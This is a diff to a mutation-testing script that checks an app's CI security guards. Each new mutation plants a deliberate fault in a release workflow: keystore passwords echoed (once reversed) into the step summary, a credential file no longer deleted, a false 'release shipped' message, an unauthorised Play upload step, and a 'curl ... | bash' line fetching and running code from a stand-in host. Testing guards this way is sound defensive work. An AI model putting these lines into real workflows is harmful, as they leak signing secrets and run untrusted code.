@@ -36,12 +36,14 @@ import subprocess
 import sys
 
 ROOT = pathlib.Path(__file__).resolve().parent.parent
-# The guard suite, MINUS the `slow` tag by default.
+# The guard suite, minus any `slow`-tagged test.
 #
-# One tagged test builds a 64000-character document to overflow the YAML
-# loader, which costs ~45s. Run once per mutation that is 70 minutes of CI for
-# a property one mutation tests. Mutations that need it set `slow=True` and
-# get the full suite; everything else runs in a third of the time (#217).
+# NOTHING carries that tag today — the test that did was reverted with #217 —
+# so this currently excludes nothing, and `dart_test.yaml` says so too. The
+# machinery stays because the reason for it is real and was measured: a guard
+# whose input is expensive is run once per mutation, and a 45s test turns a
+# 20-minute battery into 90. When the next expensive guard arrives it tags
+# itself and the mutations that need it set `slow=True` (#229).
 SUITE = ["flutter", "test", "--no-pub", "--tags", "guard",
          "--exclude-tags", "slow"]
 SUITE_SLOW = ["flutter", "test", "--no-pub", "--tags", "guard"]
@@ -325,6 +327,87 @@ MUTATIONS: list[Mutation] = [
                  'echo "credentials forgotten"', 1),
              "the service-account key and the keystore both survive the job",
              'destroys'),
+    # ---- #224/#225: the positive controls ---------------------------------
+    # Every one of these was GREEN at b80cf0f, and each is a test that could
+    # not fail for a different reason: a file that was never planted, a body
+    # that exited before the leak, a transform nobody searched for, and an
+    # exemption keyed on the wrong side of the assignment.
+    Mutation("#224", "play-promote's forget stops deleting the key",
+             ".github/workflows/play-promote.yml",
+             sub(r'(          )rm -f "\$RUNNER_TEMP/play-sa\.json"',
+                 r'\1echo "credentials forgotten"', 1),
+             "the service-account key survives the job",
+             'destroys'),
+    Mutation("#224", "play-api-check's forget drops the key from its rm",
+             ".github/workflows/play-api-check.yml",
+             sub(r'rm -f "\$RUNNER_TEMP/play-sa\.json" "\$RUNNER_TEMP/upload\.keystore"',
+                 'rm -f "$RUNNER_TEMP/upload.keystore"', 1),
+             "half the assertion was load-bearing and half asserted nothing",
+             'destroys'),
+    Mutation("#224", "the harness stops planting one of the credentials",
+             "test/guards/workflow_guard_test.dart",
+             sub(r"const _runnerCredentials = \['upload\.keystore', 'play-sa\.json'\];",
+                 "const _runnerCredentials = ['upload.keystore'];", 1),
+             "the precondition is what stops the assertion going vacuous again",
+             'precondition'),
+    Mutation("#225", "a secret is published after the password compare",
+             ".github/workflows/release.yml",
+             sub(r'(          echo "the keystore opens, and holds the configured alias"\n)',
+                 r'\1          echo "$HS_KEYSTORE_PASS" >> "${GITHUB_STEP_SUMMARY:-/dev/null}"\n', 1),
+             "distinct sentinels made the body exit before ever reaching this line",
+             'published-secret'),
+    Mutation("#225", "a secret is published reversed",
+             ".github/workflows/release.yml",
+             sub(r"(          flutter build appbundle)",
+                 r'          printf %s "$HS_KEY_PASS" | rev >> "$GITHUB_STEP_SUMMARY"\n\1', 1),
+             "rev is one command and the reader reverses it instantly",
+             'published-secret'),
+    # ---- #226: the steps that make a claim -------------------------------
+    # Both GREEN at b80cf0f. `say` is the only thing on the failed-gate path
+    # that says nothing shipped, and it could say the reverse.
+    Mutation("#226", "the failed-gate notice claims a release shipped",
+             ".github/workflows/release.yml",
+             sub(r'echo "gate failed on \$TAG; nothing shipped"',
+                 'echo "release $TAG shipped to production"', 1),
+             "the workflow announces a shipped release on a gate that failed",
+             'honesty'),
+    Mutation("#226", "the secrets pre-flight stops checking",
+             ".github/workflows/release.yml",
+             sub(r'(id: secrets_present\n(?:[^\n]*\n)*?        )run: \|\n(?:          [^\n]*\n|\n)*',
+                 r'\1run: echo "all five secrets are present"\n\n', 1),
+             "a step named Assert every secret is present announces a check it does not do",
+             'secrets-preflight'),
+    # ---- #220/#230: the guards that had no mutations ----------------------
+    Mutation("#220", "the gcloud stub stops recording its argv",
+             "test/guards/secrets_scripts_test.dart",
+             sub(r'echo "gcloud \\\$\*" >> "\$\{_tmp\.path\}/gcloud\.log"\n', "", 1),
+             "the channel that catches a key on a command line goes quiet",
+             'argv'),
+    # Two edits, because removing a protection proves nothing unless the thing
+    # it protects against is present. Nothing in the file has the laundering
+    # shape today, so the widened window alone changed no verdict and the
+    # entry SURVIVED -- the battery reporting, correctly, that it tested
+    # nothing (#230).
+    Mutation("#220", "the harmless exemption widens, and a call hides behind it",
+             "test/guards/secrets_scripts_test.dart",
+             chain(
+                 sub(r"      if \(harmless\.hasMatch\(lines\[i\]\)\) continue;",
+                     "      if (harmless.hasMatch(\n"
+                     "        lines.sublist(i, (i + 3).clamp(0, lines.length)).join(' '),\n"
+                     "      )) {\n        continue;\n      }", 1),
+                 sub(r"(\nvoid main\(\) \{)",
+                     r'\nvoid _launder() {\n'
+                     r'  Process.runSync("/bin/sh", ["-c", "echo hi"]);\n'
+                     r'  Process.runSync("chmod", ["+x", "/tmp/x"]);\n'
+                     r'}\1', 1),
+             ),
+             "a raw call with a chmod two lines away is laundered by the window",
+             'leak-chokepoint'),
+    Mutation("#230", "make_upload_key stops enforcing a minimum password length",
+             "tools/make_upload_key.sh",
+             sub(r'if \[ "\$\{#HS_KEYSTORE_PASS\}" -lt 12 \]; then\n(?:.*\n)*?fi\n', "", 1),
+             "the leak scan only searches transformed forms for 8+ characters",
+             'password-length'),
     # ---- #202: the ruleset, compared as whole tokens ---------------------
     # All three were GREEN at round eight: `contains('active')` is satisfied
     # by `inactive`, and `contains('gate:15368')` by `CI / gate:15368` --
@@ -545,13 +628,13 @@ MUTATIONS: list[Mutation] = [
              'still pending'),
     # ---- #182: the upload rule applied to every file, and step sets -------
     Mutation("#182", "a Play upload added to ci.yml", ".github/workflows/ci.yml",
-             sub(r"(      - id: gate\n        name: Quality gate\n        run: tools/gate\.sh\n)",
+             sub(r"(        run: tools/gate\.sh\n)",
                  r"\1\n      - id: exfil\n        uses: r0adkll/upload-google-play@v1\n"
                  "        with:\n          serviceAccountJsonPlainText: x\n          track: production\n"),
              "ci.yml is workflow_called with secrets: inherit, so this uploads with the real key on a tag",
              'upload-scope:'),
     Mutation("#182", "an extra step in the ci gate job", ".github/workflows/ci.yml",
-             sub(r"(      - id: gate\n        name: Quality gate\n        run: tools/gate\.sh\n)",
+             sub(r"(        run: tools/gate\.sh\n)",
                  r"\1\n      - id: extra\n        run: curl -sSL https://example.test/x | bash\n"),
              "an added step in the gate job runs with whatever secrets the caller inherited",
              'ci-shape: exactly these steps'),
